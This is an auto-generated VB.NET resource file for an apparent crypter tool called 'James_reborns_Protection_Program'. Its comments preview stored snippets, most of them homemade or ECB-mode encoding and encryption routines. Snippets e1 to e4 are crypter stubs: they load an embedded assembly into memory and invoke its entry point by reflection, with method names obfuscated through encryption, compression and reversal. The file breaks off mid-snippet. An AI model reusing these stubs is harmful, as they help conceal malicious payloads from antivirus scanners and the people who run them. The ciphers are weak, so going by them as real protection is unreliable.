'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.42000
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On

Imports System

Namespace My.Resources
    
    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "15.0.0.0"),  _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
    Friend Module Resources
        
        Private resourceMan As Global.System.Resources.ResourceManager
        
        Private resourceCulture As Global.System.Globalization.CultureInfo
        
        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("James_reborns_Protection_Program.Resources", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property
        
        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set
                resourceCulture = value
            End Set
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function DecryptString(ByVal Message As String, ByVal Passphrase As String) As String
        '''        Dim Results() As Byte
        '''        Dim UTF8 As UTF8Encoding = New UTF8Encoding
        '''        Using HashProvider As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
        '''            Dim TDESKey() As Byte = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase))
        '''            Using TDESAlgorithm As TripleDESCryptoServiceProvider = New TripleDESCryptoServiceProvider() With {.Key = TDESKey, .Mode = CipherMode [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property _3DES___Decrypt__() As String
            Get
                Return ResourceManager.GetString("_3DES___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Shared Function EncryptString(ByVal Message As String, ByVal Passphrase As String) As String
        '''        Dim Results() As Byte
        '''        Dim UTF8 As UTF8Encoding = New UTF8Encoding
        '''        Using HashProvider As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
        '''            Dim TDESKey() As Byte = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase))
        '''            Using TDESAlgorithm As TripleDESCryptoServiceProvider = New TripleDESCryptoServiceProvider() With {.Key = TDESKey, .Mode = CipherMode.ECB [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property _3DES_ENCRYPT() As String
            Get
                Return ResourceManager.GetString("_3DES_ENCRYPT", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function AER256_Decrypt(ByVal message As String, Optional ByVal key As String = &quot;A256-CRYPO&quot;) As String
        '''        Dim out As New System.Text.StringBuilder
        '''        If key.Length &lt; 10 Then Return message
        '''        Dim intkey() As Byte = System.Text.Encoding.UTF8.GetBytes(key)
        '''
        '''        Dim oOutString As String() = Split(message, &quot;, &quot;)
        '''        For i As Integer = 0 To oOutString.Length - 1
        '''            oOutString(i) = oOutString(i).Replace(&quot;.&quot;, &quot;,&quot;)
        '''        Next
        '''        For x As Integer = 0 To oOu [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property AER256_Decrypt() As String
            Get
                Return ResourceManager.GetString("AER256_Decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function AER256_Encrypt(ByVal message As String, Optional ByVal key As String = &quot;A256-CRYPO&quot;) As String
        '''        Dim out As New System.Text.StringBuilder
        '''        If key.Length &lt; 10 Then Return message
        '''        Dim intkey() As Byte = System.Text.Encoding.UTF8.GetBytes(key)
        '''        Dim x As Integer
        '''        Do While x &lt; message.Length
        '''            Dim hextemp As String = &quot;&quot;
        '''            Dim y As String = &quot;&quot;
        '''            If x &gt; 0 Then y = &quot;, &quot;
        '''            For i As Integer = x To Math.Round(key.Le [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property AER256_Encrypt() As String
            Get
                Return ResourceManager.GetString("AER256_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function AES_Decrypt(ByVal input As String, ByVal pass As String) As String
        '''        Dim AES As New RijndaelManaged
        '''        Dim Hash_AES As New MD5CryptoServiceProvider
        '''        Dim decrypted As String = &quot;&quot;
        '''        Try
        '''            Dim hash(31) As Byte
        '''            Dim temp As Byte() = Hash_AES.ComputeHash(Encoding.ASCII.GetBytes(pass))
        '''            Array.Copy(temp, 0, hash, 0, 16)
        '''            Array.Copy(temp, 0, hash, 15, 16)
        '''            AES.Key = hash
        '''            AES.Mode = CipherMode.ECB        ''' [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property AES_Decrypt() As String
            Get
                Return ResourceManager.GetString("AES_Decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function AES_Encrypt(ByVal input As String, ByVal pass As String) As String
        '''        Dim AES As New RijndaelManaged
        '''        Dim Hash_AES As New MD5CryptoServiceProvider
        '''        Dim encrypted As String = &quot;&quot;
        '''        Try
        '''            Dim hash(31) As Byte
        '''            Dim temp As Byte() = Hash_AES.ComputeHash(Encoding.ASCII.GetBytes(pass))
        '''            Array.Copy(temp, 0, hash, 0, 16)
        '''            Array.Copy(temp, 0, hash, 15, 16)
        '''            AES.Key = hash
        '''            AES.Mode = CipherMode.ECB        ''' [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property AES_Encrypt() As String
            Get
                Return ResourceManager.GetString("AES_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function ARMON64_Decrypt(ByVal message As String, Optional ByVal key As String = &quot;ARMON64-CRYPO&quot;) As String
        '''        Dim out As New System.Text.StringBuilder
        '''        If key.Length &lt; 6 Then Return message
        '''        Dim intkey() As Byte = System.Text.Encoding.UTF8.GetBytes(key)
        '''        message = message.Replace(&quot;.&quot;, &quot;,&quot;)
        '''        Dim oOutString As String() = Split(message, &quot;+&quot;)
        '''        For x As Integer = 0 To oOutString.Length - 1
        '''            For z As Integer = key.Length - 1 To 0 Step -1
        '''      [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ARMON64_Decrypt() As String
            Get
                Return ResourceManager.GetString("ARMON64_Decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to    Public Function ARMON64_Encrypt(ByVal message As String, Optional ByVal key As String = &quot;ARMON64-CRYPO&quot;) As String
        '''        Dim out As New System.Text.StringBuilder
        '''        If key.Length &lt; 3 Then Return message
        '''        Dim intkey() As Byte = System.Text.Encoding.UTF8.GetBytes(key)
        '''        Dim x As Integer
        '''        Do While x &lt; message.Length
        '''            Dim hextemp As String = &quot;&quot;
        '''            Dim y As String = &quot;&quot;
        '''            If x &gt; 0 Then y = &quot;+&quot;
        '''            For i As Integer = x To Math.Round(key.L [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ARMON64_Encrypt() As String
            Get
                Return ResourceManager.GetString("ARMON64_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Function Atbash_Cipher(ByVal input As String)
        '''        Dim result As String = &quot;&quot;
        '''        For Each x As Char In input
        '''            If Char.IsLower(x) Then
        '''                Dim diff As Integer = Asc(x) - Asc(&quot;a&quot;)
        '''                result += Chr(Asc(&quot;z&quot;) - diff)
        '''            ElseIf Char.IsUpper(x) Then
        '''                Dim diff As Integer = Asc(x) - Asc(&quot;A&quot;)
        '''                result += Chr(Asc(&quot;Z&quot;) - diff)
        '''            Else
        '''                result += x
        '''            End If
        '''        Next
        '''        Return resul [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Atbash_Cipher() As String
            Get
                Return ResourceManager.GetString("Atbash_Cipher", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function Atom128_Decode(ByVal input As String) As String
        '''        Dim key As String = &quot;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs() As Integer = {0, 0, 0}
        '''            For b As Integer = 0 To 3
        '''                enc(b) = key.IndexOf(input(i))
        '''                i = i + 1
        '''            Next
        '''            chrs(0) = (enc(0) &lt;&lt; 2) Or (enc(1) &gt;&gt; 4)
        '''   [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Atom128_Decode() As String
            Get
                Return ResourceManager.GetString("Atom128_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function Atom128_Encode(ByVal input As String) As String
        '''        input = Uri.EscapeDataString(input)
        '''        Dim key As String = &quot;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs As Integer() = {0, 0, 0}
        '''            For b As Integer = 0 To 2
        '''                If i &lt; input.Length Then chrs(b) = Asc(input(i))
        '''                i += 1
        '''            Ne [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Atom128_Encode() As String
            Get
                Return ResourceManager.GetString("Atom128_Encode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function BASE64_Decode(ByVal input As String) As String
        '''        Return Encoding.ASCII.GetString(Convert.FromBase64String(input))
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property BASE64_Decode() As String
            Get
                Return ResourceManager.GetString("BASE64_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function BASE64_Encode(ByVal input As String) As String
        '''        Return Convert.ToBase64String(Encoding.ASCII.GetBytes(input))
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property BASE64_Encode() As String
            Get
                Return ResourceManager.GetString("BASE64_Encode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function c_Decrypt(ByVal CipherText As String, ByVal Key As Integer) As String
        '''        Dim CipherChar() As Char = CipherText.ToCharArray()
        '''        Dim Ascii(CipherChar.Length) As Integer
        '''        For Count As Integer = 0 To CipherChar.Length - 1
        '''            Ascii(Count) = Asc(CipherChar(Count))
        '''            If Ascii(Count) &gt;= 65 And Ascii(Count) &lt;= 90 Then
        '''                Ascii(Count) = ((Ascii(Count) - 65 - (Key Mod 26) + 26)) Mod 26 + 65
        '''            ElseIf Ascii(Count) &gt;= 97 And Ascii(Coun [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Caesar_Cipher___Decrypt__() As String
            Get
                Return ResourceManager.GetString("Caesar_Cipher___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function c_Encrypt(ByVal PlainText As String, ByVal Key As Integer) As String
        '''        Dim PlainChar() As Char = PlainText.ToCharArray()
        '''        Dim Ascii(PlainChar.Length) As Integer
        '''        For Count As Integer = 0 To PlainChar.Length - 1
        '''            Ascii(Count) = Asc(PlainChar(Count))
        '''            If Ascii(Count) &gt;= 65 And Ascii(Count) &lt;= 90 Then
        '''                Ascii(Count) = ((Ascii(Count) - 65 + Key) Mod 26) + 65
        '''            ElseIf Ascii(Count) &gt;= 97 And Ascii(Count) &lt;= 122 Then
        '''     [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Caesar_Cipher___Encrypt__() As String
            Get
                Return ResourceManager.GetString("Caesar_Cipher___Encrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Private Function ConvertToBinary(ByVal str As String) As String
        '''        Dim converted As New StringBuilder
        '''        For Each b As Byte In Encoding.ASCII.GetBytes(str)
        '''            converted.Append(Convert.ToString(b, 2).PadLeft(8, &quot;0&quot;))
        '''        Next
        '''        Return converted.ToString()
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property ConvertToBinary() As String
            Get
                Return ResourceManager.GetString("ConvertToBinary", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Function CryptString_1(ByVal Text As String) As String
        '''        Dim CryptedString As String
        '''        Dim CharFound As Integer
        '''        Dim CryptedChar As Integer
        '''        CryptedString = &quot;&quot;
        '''        For N = 1 To Len(Text)
        '''            CharFound = SearchChar(Mid(Text, N, 1))
        '''            If CharFound &lt;= 235 Then
        '''                CryptedChar = CharFound + 20
        '''            Else
        '''                CryptedChar = CharFound - 236
        '''            End If
        '''            CryptedString = CryptedString &amp; Chr(CryptedChar)
        '''  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property CryptString_1___Draven__() As String
            Get
                Return ResourceManager.GetString("CryptString_1___Draven__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function CustomXOR_Decrypt(ByVal Input As String, ByVal pass As String) As String
        '''        Dim out As New StringBuilder
        '''        Dim Hash As New MD5CryptoServiceProvider
        '''        Dim XorHash As Byte() = Hash.ComputeHash(Encoding.ASCII.GetBytes(pass))
        '''        Dim u As Integer
        '''        For i As Integer = 0 To Input.Length - 1 Step +2
        '''            Dim tmp As String = Chr((&quot;&amp;H&quot; &amp; Input.Substring(i, 2)) Xor XorHash(u))
        '''            out.Append(tmp)
        '''            If u = pass.Length - 1 Then u = 0 Else u [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property CustomXOR_Decrypt() As String
            Get
                Return ResourceManager.GetString("CustomXOR_Decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function CustomXOR_Encrypt(ByVal Input As String, ByVal pass As String) As String
        '''        Dim out As New StringBuilder
        '''        Dim Hash As New MD5CryptoServiceProvider
        '''        Dim XorHash As Byte() = Hash.ComputeHash(Encoding.ASCII.GetBytes(pass))
        '''        Dim u As Integer
        '''        For i As Integer = 0 To Input.Length - 1
        '''            Dim tmp As String = Hex(Asc(Input(i)) Xor XorHash(u))
        '''            If tmp.Length = 1 Then tmp = &quot;0&quot; &amp; tmp
        '''            out.Append(tmp)
        '''            If u = pass.L [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property CustomXOR_Encrypt() As String
            Get
                Return ResourceManager.GetString("CustomXOR_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Private Function ConvertToAscii(ByVal str As String) As String
        '''        Dim chars As String = Regex.Replace(str, &quot;[^01]&quot;, &quot;&quot;)
        '''        Dim arr((chars.Length / 8) - 1) As Byte
        '''        For i As Integer = 0 To arr.Length - 1
        '''            arr(i) = Convert.ToByte(chars.Substring(i * 8, 8), 2)
        '''        Next
        '''        Return Encoding.ASCII.GetString(arr)
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property Decrypt_Binary() As String
            Get
                Return ResourceManager.GetString("Decrypt_Binary", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function Decrypt_CustomLine(ByVal Text_to_Decrypt As String) As String
        '''        Dim str2 As String = Text_to_Decrypt
        '''        str2 = converttoline(str2)
        '''        Dim str As String = Regex.Replace(str2, &quot;[^01]&quot;, &quot;&quot;)
        '''        Dim bytes As Byte() = New Byte((CInt(Math.Round((str.Length / 8) - 1)) + 1) - 1) {}
        '''        Dim num2 As Integer = (bytes.Length - 1)
        '''        Dim i As Integer = 0
        '''        Do While (i &lt;= num2)
        '''            bytes(i) = Convert.ToByte(str.Substring((i * 8), 8), 2)
        '''       [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Decrypt_CustomLine() As String
            Get
                Return ResourceManager.GetString("Decrypt_CustomLine", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function Hex2String(ByVal input As String) As String
        '''        Dim out As New StringBuilder
        '''        Dim data As String() = Split(input, &quot; &quot;)
        '''        For Each s As String In data
        '''            out.Append(Chr(&quot;&amp;H&quot; &amp; s))
        '''        Next
        '''        Return out.ToString
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property Decrypt_Hex() As String
            Get
                Return ResourceManager.GetString("Decrypt_Hex", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Function DecryptString_1(ByVal Text As String) As String
        '''        Dim DecryptedString As String
        '''        Dim CharFound As Integer
        '''        Dim DecryptedChar As Integer
        '''        DecryptedString = &quot;&quot;
        '''        For N = 1 To Len(Text)
        '''            CharFound = SearchChar(Mid(Text, N, 1))
        '''            If CharFound &gt;= 20 Then
        '''                DecryptedChar = CharFound - 20
        '''            Else
        '''                DecryptedChar = CharFound + 236
        '''            End If
        '''            DecryptedString = DecryptedString &amp; Chr( [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property DecryptString_1___Draven_Decrypt__() As String
            Get
                Return ResourceManager.GetString("DecryptString_1___Draven_Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function DES_Decrypt(ByVal input As String, ByVal pass As String) As String
        '''        Dim DES As New DESCryptoServiceProvider
        '''        Dim Hash_DES As New MD5CryptoServiceProvider
        '''        Dim decrypted As String = &quot;&quot;
        '''        Try
        '''            Dim hash(7) As Byte
        '''            Dim temp As Byte() = Hash_DES.ComputeHash(Encoding.ASCII.GetBytes(pass))
        '''            Array.Copy(temp, 0, hash, 0, 8)
        '''            DES.Key = hash
        '''            DES.Mode = CipherMode.ECB
        '''            Dim DESDecrypter As ICrypto [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property DES_Decrypt() As String
            Get
                Return ResourceManager.GetString("DES_Decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function DES_Encrypt(ByVal input As String, ByVal pass As String) As String
        '''        Dim DES As New DESCryptoServiceProvider
        '''        Dim Hash_DES As New MD5CryptoServiceProvider
        '''        Dim encrypted As String = &quot;&quot;
        '''        Try
        '''            Dim hash(7) As Byte
        '''            Dim temp As Byte() = Hash_DES.ComputeHash(Encoding.ASCII.GetBytes(pass))
        '''            Array.Copy(temp, 0, hash, 0, 8)
        '''            DES.Key = hash
        '''            DES.Mode = CipherMode.ECB
        '''            Dim DESEncrypter As ICrypto [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property DES_Encrypt() As String
            Get
                Return ResourceManager.GetString("DES_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Dim rca1 As String = DeCrypt(&quot;Ñ0Ž¯„&quot;, &quot;CRYPTER_RAJAWI&quot;)
        '''        Dim rca2 As System.Object = System.AppDomain.CurrentDomain.Load(&quot;R4Jaw!&quot;).EntryPoint
        '''        CallByName(rca2, rca1, CallType.Method, Nothing, Nothing).
        '''</summary>
        Friend ReadOnly Property e1() As String
            Get
                Return ResourceManager.GetString("e1", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Dim rca1 As String = DeCrypt(&quot;Ñ0Ž¯„&quot;, &quot;CRYPTER_RAJAWI&quot;)
        '''        Dim rca2 As System.Object = System.AppDomain.CurrentDomain.Load(&quot;R4Jaw!&quot;).EntryPoint
        '''        CallByName(rca2, rca1, CallType.Method, Nothing, Nothing)
        '''    End Sub
        '''    Public Shared Function DeCrypt(ByVal Data As String, ByVal key As String) As String
        '''        Return Encoding.Default.GetString(DeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)))
        '''    End Function
        '''    Public Shared Function DeCrypt(ByVal Data() As Byte, [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property e2() As String
            Get
                Return ResourceManager.GetString("e2", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim rca1 As Object = DZip(&quot;AAQZIZGynh8YoMGykNPAAAAD&quot;)
        '''
        '''        Dim rca2 As System.Object = Reflection.Assembly.Load(&quot;R4Jaw!&quot;).EntryPoint
        '''
        '''        CallByName(rca2, StrReverse(rca1), CallType.Method, &quot;&quot;, Nothing)
        '''
        '''    End Sub
        '''    Public Function DZip(ByVal compressedText As String) As String
        '''        Dim gzBuffer As Byte() = Convert.FromBase64String(compressedText)
        '''        Using ms As New MemoryStream()
        '''            Dim msgLength As Integer = BitConverter.ToInt32(gzBuffer, 0)
        '''            ms.Write(gz [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property e3() As String
            Get
                Return ResourceManager.GetString("e3", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Sub Main()
        '''        Dim mohamed As String = AES_Decrypt(&quot;wHaWFbSPhHKQb6tY9Ip+Jw==&quot;, &quot;zuieryiudsfjksdgfiuyrt85859&quot;)
        '''        Dim yassine As String = AES_Decrypt(&quot;a4nyLEShSPiNAqfujAjCZw==&quot;, &quot;zuieryiudsfjksdgfiuyrt85859&quot;)
        '''        Dim raja As Object = System.AppDomain.CurrentDomain.Load(&quot;R4Jaw!&quot;)
        '''        Dim rca1 As Object = CallByName(raja, mohamed, CallType.Get)
        '''        CallByName(rca1, yassine, CallType.Method, &quot;&quot;, Nothing)
        '''    End Sub
        '''    Public Function AES_Decrypt(ByVal input As String, ByVal pas [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property e4() As String
            Get
                Return ResourceManager.GetString("e4", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to         Private Shared Function converttoline(ByVal text_to_convert As String) As String
        '''        Dim str2 As String = text_to_convert
        '''        If str2.Contains(&quot;|&quot;) Then
        '''            Return str2.Replace(&quot; || &quot;, &quot;0&quot;).Replace(&quot; | &quot;, &quot;1&quot;)
        '''        End If
        '''        Return str2.Replace(&quot;0&quot;, &quot; || &quot;).Replace(&quot;1&quot;, &quot; | &quot;)
        '''    End Function
        '''	
        '''	Public Shared Function Encrypt_CustomLine(ByVal text_to_Encrypt As String) As String
        '''        Dim str2 As String = text_to_Encrypt
        '''        Dim builder As New StringBuilder
        ''' [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Encrypt_CustomLine() As String
            Get
                Return ResourceManager.GetString("Encrypt_CustomLine", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to    Public Function EnvY_Encrypt(ByVal input As String, ByVal pass As String) As String
        '''        Dim out As String
        '''        input = Logintextbox1.Text
        '''        out = AES_Encrypt(input, Key)
        '''        out = RC2Encrypt(out, Key)
        '''        out = XOR_Encrypt(out, Key)
        '''        out = ESAB46_Encode(out)
        '''        Return out.ToString
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property EnvY_Encrypt() As String
            Get
                Return ResourceManager.GetString("EnvY_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function EnvY_Decrypt(ByVal input As String, ByVal pass As String) As String
        '''        Dim out As String
        '''        input = Logintextbox1.Text
        '''        out = ESAB46_Decode(input)
        '''        out = XOR_Decrypt(out, Key)
        '''        out = RC2Decrypt(out, Key)
        '''        out = AES_Decrypt(out, Key)
        '''        Return out.ToString
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property EnvY_S_Encryption___Decrypt__() As String
            Get
                Return ResourceManager.GetString("EnvY_S_Encryption___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to    Public Function ESAB46_Decode(ByVal input As String) As String
        '''        Dim key As String = &quot;ABCDqrs456tuvNOPwxyz012KLM3789=+QRSTUVWXYZabcdefghijklmnopEFGHIJ/&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs() As Integer = {0, 0, 0}
        '''            For b As Integer = 0 To 3
        '''                enc(b) = key.IndexOf(input(i))
        '''                i = i + 1
        '''            Next
        '''            chrs(0) = (enc(0) &lt;&lt; 2) Or (enc(1) &gt;&gt; 4)
        '''     [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ESAB46_Decode() As String
            Get
                Return ResourceManager.GetString("ESAB46_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function ESAB46_Encode(ByVal input As String) As String
        '''        input = Uri.EscapeDataString(input)
        '''        Dim key As String = &quot;ABCDqrs456tuvNOPwxyz012KLM3789=+QRSTUVWXYZabcdefghijklmnopEFGHIJ/&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs As Integer() = {0, 0, 0}
        '''            For b As Integer = 0 To 2
        '''                If i &lt; input.Length Then chrs(b) = Asc(input(i))
        '''                i += 1
        '''            Nex [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ESAB46_Encode() As String
            Get
                Return ResourceManager.GetString("ESAB46_Encode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function EZIP64_Decrypt(ByVal message As String, Optional ByVal key As String = &quot;EZIP64-CRYPO&quot;) As String
        '''        Dim out As New System.Text.StringBuilder
        '''        If key.Length &lt; 10 Then Return message
        '''        Dim intkey() As Byte = System.Text.Encoding.UTF8.GetBytes(key)
        '''
        '''        Dim oOutString As String() = Split(message, &quot;/&quot;)
        '''        For i As Integer = 0 To oOutString.Length - 1
        '''            oOutString(i) = oOutString(i).Replace(&quot;.&quot;, &quot;,&quot;)
        '''        Next
        '''        For x As Integer = 0 To oO [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property EZIP64_Decrypt() As String
            Get
                Return ResourceManager.GetString("EZIP64_Decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function EZIP64_Encrypt(ByVal message As String, Optional ByVal key As String = &quot;EZIP64-CRYPO&quot;) As String
        '''        Dim out As New System.Text.StringBuilder
        '''        If key.Length &lt; 10 Then Return message
        '''        Dim intkey() As Byte = System.Text.Encoding.UTF8.GetBytes(key)
        '''        Dim x As Integer
        '''        Do While x &lt; message.Length
        '''            Dim hextemp As String = &quot;&quot;
        '''            Dim y As String = &quot;&quot;
        '''            If x &gt; 0 Then y = &quot;/&quot;
        '''            For i As Integer = x To Math.Round(key.L [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property EZIP64_Encrypt() As String
            Get
                Return ResourceManager.GetString("EZIP64_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function FERON74_Decode(ByVal input As String) As String
        '''        Dim key As String = &quot;75XYTabcS/UVWdefADqr6RuvN8PBCsQtwx2KLyz+OM3Hk9ghi01ZFlmnjopE=GIJ4&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs() As Integer = {0, 0, 0}
        '''            For b As Integer = 0 To 3
        '''                enc(b) = key.IndexOf(input(i))
        '''                i = i + 1
        '''            Next
        '''            chrs(0) = (enc(0) &lt;&lt; 2) Or (enc(1) &gt;&gt; 4)
        '''   [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property FERON74_Decode() As String
            Get
                Return ResourceManager.GetString("FERON74_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to    Public Function FERON74_Encode(ByVal input As String) As String
        '''        input = Uri.EscapeDataString(input)
        '''        Dim key As String = &quot;75XYTabcS/UVWdefADqr6RuvN8PBCsQtwx2KLyz+OM3Hk9ghi01ZFlmnjopE=GIJ4&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs As Integer() = {0, 0, 0}
        '''            For b As Integer = 0 To 2
        '''                If i &lt; input.Length Then chrs(b) = Asc(input(i))
        '''                i += 1
        '''            Nex [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property FERON74_Encode() As String
            Get
                Return ResourceManager.GetString("FERON74_Encode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function GILA7_Decode(ByVal input As String) As String
        '''        Dim key As String = &quot;7ZSTJK+W=cVtBCasyf0gzA8uvwDEq3XH/1RMNOILPQU4klm65YbdeFrx2hij9nopG&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
